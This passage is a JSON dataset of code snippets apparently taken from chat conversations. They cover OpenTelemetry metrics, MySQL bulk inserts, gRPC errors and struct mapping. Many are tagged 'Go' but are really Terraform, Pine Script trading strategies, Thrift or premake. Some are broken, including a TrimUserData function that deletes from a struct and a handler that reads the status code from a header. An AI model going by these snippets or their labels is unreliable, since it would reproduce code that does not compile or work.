    "code": "// SetBaselineId sets baseline Id for certain integration job\nfunc (job *ElasticRan) SetBaselineId() {\n\t// groups\n\tsubNet := job.ENodeB.SubNetwork.Name\n\tif subNet == \"LTE_Shymkent\" || subNet == \"Shymkent\" {\n\t\tjob.BaselineID = 620\n\t} else {\n\t\tjob.BaselineID = 610\n\t}\n}",
    "filename": "91da32e185b389c590bf9ea43626d879_5.go"
  },
  {
    "conversation_hash": "cab7da0d06ccc444d1d190ccbab18881",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "variable \"ecs_services\" {\n  type = map(object({\n    name         = string\n    container    = string\n    listener_arn = string\n    path         = string\n  }))\n  default = {\n    service1 = {\n      name         = \"service1\"\n      container    = \"container1\"\n      listener_arn = \"arn:aws:elasticloadbalancing:us-east-1:123456789012:listener/app/my-app-alb/abcd1234\"\n      path         = \"/service1/*\"\n    },\n    service2 = {\n      name         = \"service2\"\n      container    = \"container2\"\n      listener_arn = \"arn:aws:elasticloadbalancing:us-east-1:123456789012:listener/app/my-app-alb/abcd1234\"\n      path         = \"/service2/*\"\n    }\n  }\n}\n\nresource \"aws_lb_target_group\" \"target_groups\" {\n  for_each = var.ecs_services\n\n  name        = each.value.name\n  port        = 80\n  protocol    = \"HTTP\"\n  target_type = \"ip\"\n\n  health_check {\n    path                = \"/\"\n    protocol            = \"HTTP\"\n    matcher             = \"200-299\"\n    interval            = 30\n    timeout             = 5\n    healthy_threshold   = 3\n    unhealthy_threshold = 3\n  }\n}\n\nresource \"aws_lb_listener_rule\" \"listener_rules\" {\n  for_each = var.ecs_services\n\n  listener_arn = each.value.listener_arn\n  priority     = 100\n\n  action {\n    type             = \"forward\"\n    target_group_arn = aws_lb_target_group.target_groups[each.key].arn\n  }\n\n  condition {\n    field  = \"path-pattern\"\n    values = [each.value.path]\n  }\n}\n\nresource \"aws_ecs_service\" \"ecs_services\" {\n  for_each = var.ecs_services\n\n  name            = each.value.name\n  cluster         = aws_ecs_cluster.cluster.id\n  task_definition = aws_ecs_task_definition.task_definitions[each.value.container].arn\n  desired_count   = 1\n\n  load_balancer {\n    target_group_arn = aws_lb_target_group.target_groups[each.key].arn\n    container_name   = each.value.container\n    container_port   = 80\n  }\n}\n\n# Create your ECS cluster and task definitions here if they don't exist yet",
    "filename": "cab7da0d06ccc444d1d190ccbab18881_0.go"
  },
  {
    "conversation_hash": "9655a22f4fa2615406a769831a3f318c",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "meter := otel.GetMeterProvider().Meter(\"myapp\")\n\n   // Create a counter instrument\n   counter := metric.Must(meter).NewInt64Counter(\"requests_processed\")\n\n   // Increment the counter\n   counter.Add(ctx, 1)",
    "filename": "9655a22f4fa2615406a769831a3f318c_2.go"
  },
  {
    "conversation_hash": "9655a22f4fa2615406a769831a3f318c",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "meter := otel.GetMeterProvider().Meter(\"myapp\")\n\n   counter := metric.Must(meter).NewFloat64Counter(\"http_server_requests_seconds_count\")\n\n   // Increment the counter with the desired labels\n   counter.Add(ctx, 1.0, label.String(\"path\", \"/users\"), label.String(\"method\", \"GET\"))",
    "filename": "9655a22f4fa2615406a769831a3f318c_5.go"
  },
  {
    "conversation_hash": "9655a22f4fa2615406a769831a3f318c",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "promExporter, _ := prometheus.NewExporter(prometheus.Options{})\n   otel.SetMeterProvider(prometheus.NewMeterProvider(promExporter))\n\n   tracer := otel.GetTracerProvider().Tracer(\"myapp\")\n   otel.SetGlobalTracerProvider(otel.GetTracerProvider())",
    "filename": "9655a22f4fa2615406a769831a3f318c_8.go"
  },
  {
    "conversation_hash": "9655a22f4fa2615406a769831a3f318c",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "func MetricHandler(next http.Handler) http.Handler {\n       return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n           meter := otel.GetMeterProvider().Meter(\"myapp\")\n\n           counter := metric.Must(meter).NewInt64Counter(\"http_requests_received\")\n           counter.Add(r.Context(), 1)\n\n           // Perform custom logic if needed\n\n           next.ServeHTTP(w, r)\n       })\n   }",
    "filename": "9655a22f4fa2615406a769831a3f318c_9.go"
  },
  {
    "conversation_hash": "9655a22f4fa2615406a769831a3f318c",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n       // Initialize and configure your API server\n\n       apiHandler := // Your existing API handler\n\n       wrappedHandler := MetricHandler(apiHandler)\n       http.Handle(\"/\", wrappedHandler)\n\n       // Start the server\n       // ...\n   }",
    "filename": "9655a22f4fa2615406a769831a3f318c_10.go"
  },
  {
    "conversation_hash": "9655a22f4fa2615406a769831a3f318c",
    "code_index": 12,
    "language": "Go",
    "libraries": [],
    "code": "promExporter, _ := prometheus.NewExporter(prometheus.Options{})\n   otel.SetMeterProvider(prometheus.NewMeterProvider(promExporter))\n\n   tracer := otel.GetTracerProvider().Tracer(\"myapp\")\n   otel.SetGlobalTracerProvider(otel.GetTracerProvider())",
    "filename": "9655a22f4fa2615406a769831a3f318c_12.go"
  },
  {
    "conversation_hash": "9655a22f4fa2615406a769831a3f318c",
    "code_index": 13,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n       mux := http.NewServeMux()\n\n       // Register your routes with the multiplexer (mux)\n\n       // Wrap the default handler with OpenTelemetry middleware\n       handler := otelhttp.NewHandler(mux, \"myapp\")\n\n       // Start the server using the wrapped handler\n       http.ListenAndServe(\":8080\", handler)\n   }",
    "filename": "9655a22f4fa2615406a769831a3f318c_13.go"
  },
  {
    "conversation_hash": "9655a22f4fa2615406a769831a3f318c",
    "code_index": 14,
    "language": "Go",
    "libraries": [],
    "code": "func MyAPIHandler(w http.ResponseWriter, r *http.Request) {\n       meter := otel.GetMeterProvider().Meter(\"myapp\")\n\n       // Create a counter instrument\n       counter := metric.Must(meter).NewInt64Counter(\"api_requests_count\")\n\n       // Record the metric\n       counter.Add(r.Context(), 1)\n\n       // Perform your API logic\n\n       // ...\n   }",
    "filename": "9655a22f4fa2615406a769831a3f318c_14.go"
  },
  {
    "conversation_hash": "9655a22f4fa2615406a769831a3f318c",
    "code_index": 17,
    "language": "Go",
    "libraries": [],
    "code": "func MyAPIHandler(w http.ResponseWriter, r *http.Request) {\n       // Perform custom logic\n\n       // ...\n   }\n\n   // Wrap the API handler using OpenTelemetry middleware\n   wrappedHandler := otelhttp.NewHandler(http.HandlerFunc(MyAPIHandler), \"myapp\")",
    "filename": "9655a22f4fa2615406a769831a3f318c_17.go"
  },
  {
    "conversation_hash": "9655a22f4fa2615406a769831a3f318c",
    "code_index": 18,
    "language": "Go",
    "libraries": [],
    "code": "func MyAPIHandler(w http.ResponseWriter, r *http.Request) {\n       meter := otel.GetMeterProvider().Meter(\"myapp\")\n\n       // Create a counter instrument\n       counter := metric.Must(meter).NewFloat64Counter(\"http_server_requests_seconds_sum\")\n\n       // Record the metric\n       counter.Add(r.Context(), time.Since(time.Now()).Seconds())\n\n       // Perform your API logic\n\n       // ...\n   }",
    "filename": "9655a22f4fa2615406a769831a3f318c_18.go"
  },
  {
    "conversation_hash": "9655a22f4fa2615406a769831a3f318c",
    "code_index": 19,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"fmt\"\n    \"time\"\n)\n\nfunc main() {\n    duration := 150 * time.Millisecond\n\n    // Convert duration to float milliseconds\n    milliseconds := float64(duration.Milliseconds())\n\n    fmt.Printf(\"%.3f milliseconds\\n\", milliseconds)\n}",
    "filename": "9655a22f4fa2615406a769831a3f318c_19.go"
  },
  {
    "conversation_hash": "62cd8f3e0c4230c6bc1f432e909086d3",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tw.WriteHeader(http.StatusNotFound)\n\tfmt.Println(\"HTTP status code:\", w.Header().Get(\"StatusCode\")) // Print the status code\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\thttp.ListenAndServe(\":8080\", nil)\n}",
    "filename": "62cd8f3e0c4230c6bc1f432e909086d3_0.go"
  },
  {
    "conversation_hash": "0722af1063a352cb0fb32f3b2cce64dc",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "struct Person {\n  1: string name,\n  2: i32 age,\n  3: optional string email\n}",
    "filename": "0722af1063a352cb0fb32f3b2cce64dc_4.go"
  },
  {
    "conversation_hash": "2de3668461513161f818dc6a45bb12f1",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n)\n\ntype UserData struct {\n\tID       int    `json:\"id\"`\n\tUsername string `json:\"username\"`\n\tEmail    string `json:\"email\"`\n}\n\nfunc main() {\n\tuser := UserData{\n\t\tID:       1,\n\t\tUsername: \"testuser\",\n\t\tEmail:    \"test@example.com\",\n\t}\n\n\t// 裁剪用户数据，只保留部分字段\n\ttrimmedUser := TrimUserData(user, []string{\"id\", \"username\"})\n\n\t// 打印裁剪后的用户数据\n\tfmt.Println(trimmedUser)\n}\n\n// TrimUserData 函数用于裁剪用户数据，只保留指定的字段\nfunc TrimUserData(user UserData, fields []string) UserData {\n\ttrimmedUser := UserData{}\n\tuserJSON, _ := json.Marshal(user)\n\tjson.Unmarshal(userJSON, &trimmedUser)\n\n\t// 删除不需要的字段\n\tfor field := range trimmedUser {\n\t\tdelete(trimmedUser, field)\n\t}\n\tfor _, field := range fields {\n\t\ttrimmedUser[field] = user[field]\n\t}\n\n\treturn trimmedUser\n}",
    "filename": "2de3668461513161f818dc6a45bb12f1_0.go"
  },
  {
    "conversation_hash": "809984c474b4ace2d655a08f06e53edd",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "err := // gRPC error\n   if grpc.Code(err) == codes.DeadlineExceeded {\n       // 错误类型为 Deadline Exceeded\n   } else {\n       // 其他类型的错误\n   }",
    "filename": "809984c474b4ace2d655a08f06e53edd_6.go"
  },
  {
    "conversation_hash": "809984c474b4ace2d655a08f06e53edd",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "err := // gRPC error\n   if grpc.Code(err) == codes.DeadlineExceeded {\n       s, _ := status.FromError(err)\n       fmt.Println(s.Err())\n   }",
    "filename": "809984c474b4ace2d655a08f06e53edd_7.go"
  },
  {
    "conversation_hash": "fef3ea88817bfebf9b4d8e1c96e3b9e7",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    person := Person{\n        Name: \"John Doe\",\n        Age:  30,\n    }\n\n    fmt.Println(person.Name) // Output: John Doe\n    fmt.Println(person.Age)  // Output: 30\n}",
    "filename": "fef3ea88817bfebf9b4d8e1c96e3b9e7_1.go"
  },
  {
    "conversation_hash": "bb9b09b2e2acf985dcb57d9c25d2580e",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstrategy(\"双指标策略示例\", overlay=true)\n\n// 定义第一个指标（例如，5日均线）\nma5Period = input(5, title=\"5日均线周期\")\nma5 = sma(close, ma5Period)\n\n// 定义第二个指标（例如，30日均线）\nma30Period = input(30, title=\"30日均线周期\")\nma30 = sma(close, ma30Period)\n\n// 定义第三个指标（例如，MACD）\n[macdLine, signalLine, _] = macd(close, 12, 26, 9)\nmacdCross = macdLine > signalLine ? 1 : macdLine < signalLine ? -1 : 0\n\n// 设置进入策略的条件\nenterConditionLong = crossover(ma5, ma30) and macdCross == 1\nenterConditionShort = crossunder(ma5, ma30) and macdCross == -1\n\n// 设置离开策略的条件\nexitConditionLong = crossunder(ma5, ma30) and macdCross == -1\nexitConditionShort = crossover(ma5, ma30) and macdCross == 1\n\n// 进入多头仓位\nstrategy.entry(\"Enter Long\", strategy.long, when=enterConditionLong)\n\n// 离开多头仓位\nstrategy.close(\"Enter Long\", when=exitConditionLong)\n\n// 进入空头仓位\nstrategy.entry(\"Enter Short\", strategy.short, when=enterConditionShort)\n\n// 离开空头仓位\nstrategy.close(\"Enter Short\", when=exitConditionShort)",
    "filename": "bb9b09b2e2acf985dcb57d9c25d2580e_2.go"
  },
  {
    "conversation_hash": "bb9b09b2e2acf985dcb57d9c25d2580e",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstrategy(\"双指标策略示例\", overlay=true)\n\n// 定义第一个指标（5日均线）\nma5Period = input(5, title=\"5日均线周期\")\nma5 = sma(close, ma5Period)\n\n// 定义第二个指标（30日均线）\nma30Period = input(30, title=\"30日均线周期\")\nma30 = sma(close, ma30Period)\n\n// 定义第三个指标（MACD）\n[_, _, macdhist] = macd(close, 12, 26, 9)\n\n// 变量保存上一次的信号\nvar int prevSignal = 0\n\n// 设置进入策略的条件\nenterConditionLong = crossover(ma5, ma30) and macdhist > 0\nenterConditionShort = crossunder(ma5, ma30) and macdhist < 0\n\n// 设置离开策略的条件\nexitConditionLong = crossunder(ma5, ma30)\nexitConditionShort = crossover(ma5, ma30)\n\n// 进入多头仓位\nif enterConditionLong\n    strategy.entry(\"Enter Long\", strategy.long)\n    prevSignal := 1\n\n// 离开多头仓位\nif exitConditionLong and prevSignal == 1\n    strategy.close(\"Enter Long\")\n    prevSignal := 0\n\n// 进入空头仓位\nif enterConditionShort\n    strategy.entry(\"Enter Short\", strategy.short)\n    prevSignal := -1\n\n// 离开空头仓位\nif exitConditionShort and prevSignal == -1\n    strategy.close(\"Enter Short\")\n    prevSignal := 0",
    "filename": "bb9b09b2e2acf985dcb57d9c25d2580e_3.go"
  },
  {
    "conversation_hash": "ac2f593bf9eb8d5adf05302984792976",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstrategy(\"Moving Average and MACD Strategy\", overlay=true)\n\n// 定义均线长度\nlength1 = 5\nlength2 = 30\n\n// 计算移动平均线\nma1 = sma(close, length1)\nma2 = sma(close, length2)\n\n// 计算MACD指标\n[macdLine, signalLine, _] = macd(close, 12, 26, 9)\nmacdCross = crossover(ma1, ma2) and crossover(macdLine, signalLine)  // 5日均线上穿30日均线且MACD金叉\nmacdDeathCross = crossunder(ma1, ma2) and crossunder(macdLine, signalLine)  // 5日均线下穿30日均线且MACD死叉\n\n// 判断条件并执行交易\nif macdCross\n    strategy.entry(\"Buy\", strategy.long)  // 买入\nif macdDeathCross\n    strategy.entry(\"Sell\", strategy.short)  // 卖出",
    "filename": "ac2f593bf9eb8d5adf05302984792976_2.go"
  },
  {
    "conversation_hash": "ac2f593bf9eb8d5adf05302984792976",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstrategy(\"Moving Average and MACD Strategy\", overlay=true)\n\n// 定义均线长度\nlength1 = 5\nlength2 = 30\n\n// 计算移动平均线\nma1 = sma(close, length1)\nma2 = sma(close, length2)\n\n// 计算MACD指标\n[macdLine, signalLine, _] = macd(close, 12, 26, 9)\nmacdCross = crossover(ma1, ma2) and crossover(macdLine, signalLine)  // 5日均线上穿30日均线且MACD金叉\nmacdDeathCross = crossunder(ma1, ma2) and crossunder(macdLine, signalLine)  // 5日均线下穿30日均线且MACD死叉\n\n// 定义持仓变量\nvar inPosition = false\n\n// 判断条件并执行交易\nif macdCross and not inPosition\n    strategy.entry(\"Buy\", strategy.long)  // 买入\n    inPosition := true\nif macdDeathCross and inPosition\n    strategy.entry(\"Sell\", strategy.short)  // 卖出\n    inPosition := false",
    "filename": "ac2f593bf9eb8d5adf05302984792976_3.go"
  },
  {
    "conversation_hash": "ac2f593bf9eb8d5adf05302984792976",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstrategy(\"Moving Average and MACD Strategy\", overlay=true)\n\n// 定义均线长度\nlength1 = 5\nlength2 = 30\n\n// 定义等待时间\nwaitPeriod = 10\n\n// 定义当前周期计数器\nvar counter = 0\n\n// 计算移动平均线\nma1 = sma(close, length1)\nma2 = sma(close, length2)\n\n// 计算MACD指标\n[macdLine, signalLine, _] = macd(close, 12, 26, 9)\nmacdCross = crossover(ma1, ma2)  // 5日均线上穿30日均线\nmacdPositive = macdCross and crossover(macdLine, signalLine)  // 5日均线上穿30日均线且MACD金叉\n\n// 判断条件并执行交易\nif macdPositive and counter >= waitPeriod\n    strategy.entry(\"Buy\", strategy.long)  // 买入\n\n// 递增当前周期计数器\ncounter := macdCross ? 0 : counter + 1",
    "filename": "ac2f593bf9eb8d5adf05302984792976_4.go"
  },
  {
    "conversation_hash": "1a53d1963c69fdb30486621b8d8165b7",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "a := true\nb := false\n\nresult := a != b\nfmt.Println(result) // Output: true",
    "filename": "1a53d1963c69fdb30486621b8d8165b7_1.go"
  },
  {
    "conversation_hash": "1a53d1963c69fdb30486621b8d8165b7",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "for i := 1; i <= 5; i++ {\n    if i == 3 {\n        continue // Skips the rest of the loop for i=3 and proceeds to the next iteration\n    }\n    fmt.Println(i)\n}",
    "filename": "1a53d1963c69fdb30486621b8d8165b7_2.go"
  },
  {
    "conversation_hash": "81906a3f30a22abac7a6f081c431ac6f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type Person struct {\n    Name     string\n    Age      int\n}\n\ntype Employee struct {\n    FullName string\n    Years    int\n}",
    "filename": "81906a3f30a22abac7a6f081c431ac6f_0.go"
  },
  {
    "conversation_hash": "81906a3f30a22abac7a6f081c431ac6f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    person := Person{\n        Name: \"John Doe\",\n        Age:  30,\n    }\n\n    // Explicitly map Person to Employee\n    employee := Employee{\n        FullName: person.Name,\n        Years:    person.Age,\n    }\n\n    fmt.Println(person)\n    fmt.Println(employee)\n}",
    "filename": "81906a3f30a22abac7a6f081c431ac6f_1.go"
  },
  {
    "conversation_hash": "f9df85c19917fcb96262ad2965f5098f",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "vpaths {\n    [\"SDL2/\"] = \"sdl2/include/\"\n}\n\nvpaths {\n    [\"SDL2\"] = \"sdl2/include/\"\n}",
    "filename": "f9df85c19917fcb96262ad2965f5098f_6.go"
  },
  {
    "conversation_hash": "274d7d022ca21d7b309f65182b64c0d1",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io\"\n\t\"strings\"\n)\n\nfunc main() {\n\tinput := \"3896425\"\n\n\tvar out1, out2 strings.Builder\n\terr := ForkReader(strings.NewReader(input), &out1, &out2)\n\tif err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Output 1:\", out1.String())\n\tfmt.Println(\"Output 2:\", out2.String())\n}\n\nfunc ForkReader(r io.Reader, w1, w2 io.Writer) error {\n\tbuf := make([]byte, 2) // Read 2 bytes at a time\n\n\tfor {\n\t\tn, err := r.Read(buf)\n\t\tif err != nil && err != io.EOF {\n\t\t\treturn err\n\t\t}\n\n\t\tif n == 0 {\n\t\t\t// Reached end of input\n\t\t\tbreak\n\t\t}\n\n\t\t_, err = w1.Write(buf[:n])\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\t_, err = w2.Write(buf[:n])\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\n\treturn nil\n}",
    "filename": "274d7d022ca21d7b309f65182b64c0d1_0.go"
  },
  {
    "conversation_hash": "2a95eb6e9c75cfef9f5f8aa1f2ed47d6",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc compare(a, b int, operator string) int {\n\tswitch operator {\n\tcase \"gt\":\n\t\tif a > b {\n\t\t\treturn 1\n\t\t}\n\tcase \"lt\":\n\t\tif a < b {\n\t\t\treturn 1\n\t\t}\n\tcase \"eq\":\n\t\tif a == b {\n\t\t\treturn 1\n\t\t}\n\tdefault:\n\t\treturn 0\n\t}\n\treturn 0\n}\n\nfunc main() {\n\ta := 10\n\tb := 5\n\toperator := \"gt\"\n\tresult := compare(a, b, operator)\n\tfmt.Println(result)\n}",
    "filename": "2a95eb6e9c75cfef9f5f8aa1f2ed47d6_0.go"
  },
  {
    "conversation_hash": "69f9ad4bdadfe78bcb0cee8a53491f90",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func copyMap(originalMap map[string]int) map[string]int {\n    newMap := make(map[string]int)\n\n    for key, value := range originalMap {\n        newMap[key] = value\n    }\n\n    return newMap\n}",
    "filename": "69f9ad4bdadfe78bcb0cee8a53491f90_0.go"
  },
  {
    "conversation_hash": "69f9ad4bdadfe78bcb0cee8a53491f90",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "originalMap := map[string]int{\n    \"a\": 1,\n    \"b\": 2,\n}\ncopiedMap := copyMap(originalMap)",
    "filename": "69f9ad4bdadfe78bcb0cee8a53491f90_1.go"
  },
  {
    "conversation_hash": "35e2166725025206b12f791030076a4b",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"database/sql\"\n\t\"fmt\"\n\t\"log\"\n\t\"strings\"\n\n\t_ \"github.com/go-sql-driver/mysql\"\n)\n\ntype Data struct {\n\tField1 string\n\tField2 string\n\tField3 int\n}\n\nfunc main() {\n\tdb, err := sql.Open(\"mysql\", \"username:password@tcp(localhost:3306)/database\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer db.Close()\n\n\tdata := []Data{\n\t\t{Field1: \"Value1\", Field2: \"Value2\", Field3: 10},\n\t\t{Field1: \"Value3\", Field2: \"Value4\", Field3: 20},\n\t\t{Field1: \"Value5\", Field2: \"Value6\", Field3: 30},\n\t}\n\n\t// Создаем SQL-запрос и список параметров для подстановки\n\tvar values []interface{}\n\tvar placeholders []string\n\n\tfor _, d := range data {\n\t\tvalues = append(values, d.Field1, d.Field2, d.Field3)\n\t\tplaceholders = append(placeholders, \"(?, ?, ?)\")\n\t}\n\n\t// Соединяем все значения параметров через запятую\n\tsqlQuery := fmt.Sprintf(\"INSERT INTO table (field1, field2, field3) VALUES %s\", strings.Join(placeholders, \", \"))\n\n\t// Выполняем Bulk Insert\n\t_, err = db.Exec(sqlQuery, values...)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfmt.Println(\"Bulk Insert complete\")\n}",
    "filename": "35e2166725025206b12f791030076a4b_0.go"
  },
  {
    "conversation_hash": "35e2166725025206b12f791030076a4b",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"database/sql\"\n\t\"encoding/xml\"\n\t\"fmt\"\n\t\"log\"\n\t\"strings\"\n\t\"time\"\n\n\t_ \"github.com/go-sql-driver/mysql\"\n)\n\ntype TransferHist struct {\n\tCreateDtm        time.Time `xml:\"CREATE_DTM\"`\n\tTransferStartDtm time.Time `xml:\"TRANSFER_START_DTM\"`\n\tTransferEndDtm   time.Time `xml:\"TRANSFER_END_DTM\"`\n\tFileName         string    `xml:\"FILE_NAME\"`\n\tBytesSent        int64     `xml:\"BYTES_SENT\"`\n\tTransferType     string    `xml:\"TRANSFER_TYPE\"`\n\tDestination      string    `xml:\"DESTINATION\"`\n\tAttr1            string    `xml:\"ATTR_1\"`\n\tAttr2            string    `xml:\"ATTR_2\"`\n\tAttr3            string    `xml:\"ATTR_3\"`\n\tLineCnt          int       `xml:\"LINECNT\"`\n}\n\nfunc main() {\n\tdb, err := sql.Open(\"mysql\", \"username:password@tcp(localhost:3306)/database\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer db.Close()\n\n\txmlData := `\n\t<TransferHist>\n\t\t<CREATE_DTM>2022-01-01 12:00:00</CREATE_DTM>\n\t\t<TRANSFER_START_DTM>2022-01-01 12:05:00</TRANSFER_START_DTM>\n\t\t<TRANSFER_END_DTM>2022-01-01 12:10:00</TRANSFER_END_DTM>\n\t\t<FILE_NAME>example.txt</FILE_NAME>\n\t\t<BYTES_SENT>1000</BYTES_SENT>\n\t\t<TRANSFER_TYPE>FTP</TRANSFER_TYPE>\n\t\t<DESTINATION>server1</DESTINATION>\n\t\t<ATTR_1>attr1</ATTR_1>\n\t\t<ATTR_2>attr2</ATTR_2>\n\t\t<ATTR_3>attr3</ATTR_3>\n\t\t<LINECNT>10</LINECNT>\n\t</TransferHist>\n\t`\n\n\tvar transferHist TransferHist\n\tif err := xml.Unmarshal([]byte(xmlData), &transferHist); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Формируем SQL-запрос и список параметров для подстановки\n\tsqlQuery := `\n\t\tINSERT INTO transfer_hist (\n\t\t\tCREATE_DTM,\n\t\t\tTRANSFER_START_DTM,\n\t\t\tTRANSFER_END_DTM,\n\t\t\tFILE_NAME,\n\t\t\tBYTES_SENT,\n\t\t\tTRANSFER_TYPE,\n\t\t\tDESTINATION,\n\t\t\tATTR_1,\n\t\t\tATTR_2,\n\t\t\tATTR_3,\n\t\t\tLINECNT\n\t\t)\n\t\tVALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\n\t`\n\n\tvalues := []interface{}{\n\t\ttransferHist.CreateDtm,\n\t\ttransferHist.TransferStartDtm,\n\t\ttransferHist.TransferEndDtm,\n\t\ttransferHist.FileName,\n\t\ttransferHist.BytesSent,\n\t\ttransferHist.TransferType,\n\t\ttransferHist.Destination,\n\t\ttransferHist.Attr1,\n\t\ttransferHist.Attr2,\n\t\ttransferHist.Attr3,\n\t\ttransferHist.LineCnt,\n\t}\n\n\t// Выполняем Bulk Insert\n\t_, err = db.Exec(sqlQuery, values...)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfmt.Println(\"Bulk Insert complete\")\n}",
    "filename": "35e2166725025206b12f791030076a4b_1.go"
  },
  {
    "conversation_hash": "35e2166725025206b12f791030076a4b",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"database/sql\"\n\t\"fmt\"\n\t\"log\"\n\t\"time\"\n\n\t_ \"github.com/go-sql-driver/mysql\"\n)\n\ntype TransferHist struct {\n\tCreateDtm        time.Time\n\tTransferStartDtm time.Time\n\tTransferEndDtm   time.Time\n\tFileName         string\n\tBytesSent        int64\n\tTransferType     string\n\tDestination      string\n\tAttr1            string\n\tAttr2            string\n\tAttr3            string\n\tLineCnt          int\n}\n\nfunc main() {\n\tdb, err := sql.Open(\"mysql\", \"username:password@tcp(localhost:3306)/database\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer db.Close()\n\n\t// Подготавливаем выражение SQL для Bulk Insert\n\tstmt, err := db.Prepare(\"INSERT INTO transfer_hist (CREATE_DTM, TRANSFER_START_DTM, TRANSFER_END_DTM, FILE_NAME, BYTES_SENT, TRANSFER_TYPE, DESTINATION, ATTR_1, ATTR_2, ATTR_3, LINECNT) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer stmt.Close()\n\n\ttransferHists := []TransferHist{\n\t\t{\n\t\t\tCreateDtm:        time.Now(),\n\t\t\tTransferStartDtm: time.Now(),\n\t\t\tTransferEndDtm:   time.Now(),\n\t\t\tFileName:         \"example.txt\",\n\t\t\tBytesSent:        1000,\n\t\t\tTransferType:     \"FTP\",\n\t\t\tDestination:      \"server1\",\n\t\t\tAttr1:            \"attr1\",\n\t\t\tAttr2:            \"attr2\",\n\t\t\tAttr3:            \"attr3\",\n\t\t\tLineCnt:          10,\n\t\t},\n\t\t// Добавьте другие элементы TransferHist по вашему усмотрению\n\t}\n\n\t// Выполняем Bulk Insert с помощью подготовленного выражения\n\tfor _, transferHist := range transferHists {\n\t\t_, err = stmt.Exec(\n\t\t\ttransferHist.CreateDtm,\n\t\t\ttransferHist.TransferStartDtm,\n\t\t\ttransferHist.TransferEndDtm,\n\t\t\ttransferHist.FileName,\n\t\t\ttransferHist.BytesSent,\n\t\t\ttransferHist.TransferType,\n\t\t\ttransferHist.Destination,\n\t\t\ttransferHist.Attr1,\n\t\t\ttransferHist.Attr2,\n\t\t\ttransferHist.Attr3,\n\t\t\ttransferHist.LineCnt,\n\t\t)\n\t\tif err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\t}\n\n\tfmt.Println(\"Bulk Insert complete\")\n}",
    "filename": "35e2166725025206b12f791030076a4b_2.go"
  },
  {
    "conversation_hash": "35e2166725025206b12f791030076a4b",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"database/sql\"\n\t\"fmt\"\n\t\"log\"\n\t\"time\"\n\n\t_ \"github.com/go-sql-driver/mysql\"\n)\n\ntype TransferHist struct {\n\tCreateDtm        time.Time\n\tTransferStartDtm time.Time\n\tTransferEndDtm   time.Time\n\tFileName         string\n\tBytesSent        int64\n\tTransferType     string\n\tDestination      string\n\tAttr1            string\n\tAttr2            string\n\tAttr3            string\n\tLineCnt          int\n}\n\nfunc main() {\n\tdb, err := sql.Open(\"mysql\", \"username:password@tcp(localhost:3306)/database\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer db.Close()\n\n\t// Подготавливаем выражение SQL для Bulk Insert\n\tstmt, err := db.Prepare(\"INSERT INTO transfer_hist (CREATE_DTM, TRANSFER_START_DTM, TRANSFER_END_DTM, FILE_NAME, BYTES_SENT, TRANSFER_TYPE, DESTINATION, ATTR_1, ATTR_2, ATTR_3, LINECNT) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\")\n\tif err != nil 